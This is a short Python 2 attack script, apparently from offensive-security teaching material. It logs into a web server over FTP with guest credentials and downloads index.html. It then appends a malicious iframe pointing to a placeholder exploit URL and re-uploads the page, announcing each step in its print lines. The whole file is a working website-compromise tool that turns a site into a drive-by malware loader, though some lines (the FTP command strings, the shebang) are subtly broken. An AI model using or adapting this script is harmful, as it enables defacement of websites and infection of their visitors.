#!usr/bin/env python
#coding=utf-8
#网页代码注入

import ftplib

def injectPage(ftp,page,redirect):
    f = open(page+'.tmp','w')
    ftp.retrlines('RETR' + page,f.write)
    print '[+] Downloaded Page: '+page
    f.write(redirect)
    f.close()

    print '[+] Injected Malicious IFram on: '+ page
    ftp.storlines('STOR' +page,open(page +'.tmp'))
    print '[+] Uploaded Injected Page: '+ page

host = '127.0.0.1'
userName = 'guest'
passWord ='guest'

ftp = ftplib.FTP(host)
ftp.login(userName,passWord)
redirect = '<iframe src ='+"http://xxxxxxxx/exploit"'></iframe>'
injectPage(ftp,'index.html',redirect)


